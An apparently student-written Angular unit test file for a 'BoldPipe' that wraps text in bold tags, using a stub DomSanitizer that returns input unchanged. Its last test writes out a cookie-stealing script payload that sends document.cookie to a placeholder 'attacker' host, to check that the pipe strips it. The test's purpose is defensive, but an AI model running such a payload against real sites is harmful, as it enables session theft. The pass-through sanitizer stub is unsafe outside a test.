import { SecurityContext, Injectable } from '@angular/core';
import { TestBed, async, inject} from '@angular/core/testing';
import { DomSanitizer, SafeHtml, BrowserModule } from '@angular/platform-browser'

import { BoldPipe } from './bold.pipe';


@Injectable()
class CDomSanitizerImplStub extends DomSanitizer {
  constructor () {
    super()
  }
  sanitize(context: SecurityContext.HTML, value: string): string {
    return value;
  }
  bypassSecurityTrustHtml(content: string): string {
    return content;
  }
}

/**
 * 
 * 
   useValue: {
    sanitize: (ctx, val) => val,
    bypassSecurityTrustHtml: (val) => val,
   }
 */
describe('Bold Pipe', () => {
  
  let pipe: BoldPipe;
  let sanitizer: DomSanitizer;
  let ctx: SecurityContext;

  beforeEach(async(() => {
    ctx = SecurityContext.HTML
    TestBed.configureTestingModule({
      imports: [BrowserModule],
      declarations: [BoldPipe],
      providers: [{
        provide: DomSanitizer, 
        useClass: CDomSanitizerImplStub

      }]
    })//.compileComponents();

  }));

  beforeEach(() => {
    //sanitizer = TestBed.inject(DomSanitizer);
    sanitizer = new CDomSanitizerImplStub() as DomSanitizer
    console.log('sanitized', sanitizer)
    pipe = new BoldPipe(sanitizer);
  });

  it('create an instance', () => {
    expect(pipe).toBeTruthy();
  });

  it('bold text should be <b>bold text</b>', () => {
    // * arrange
    const pipe = new BoldPipe();

    // * act
    const ret = pipe.transform('bold text');

    // * assert
    expect(ret).toBe('<b>bold text</b>');
  });

  it('$%/ should be <b>$%/</b>', () => {
    // * arrange
    const pipe = new BoldPipe();

    // * act
    const ret = pipe.transform('$%/');

    // * assert
    expect(ret).toBe('<b>$%/</b>');
  });

  it('国际空间站三名宇航员返航后发现地球变了 should be <b>国际空间站三名宇航员返航后发现地球变了</b>', () => {
    // * arrange
    const pipe = new BoldPipe();

    // * act
    const ret = pipe.transform('国际空间站三名宇航员返航后发现地球变了');

    // * assert
    expect(ret).toBe('<b>国际空间站三名宇航员返航后发现地球变了</b>');
  });

  it('<script> tags should be sanitized', () => {
    // * arrange
    const pipe = new BoldPipe();

    // * act
    const ret = pipe.transform("<script>window.location='http://attacker/?cookie='+document.cookie</script>");
    console.log("ret", ret)
    // * assert
    expect(ret).toBe('<b></b>');
  });
  

});

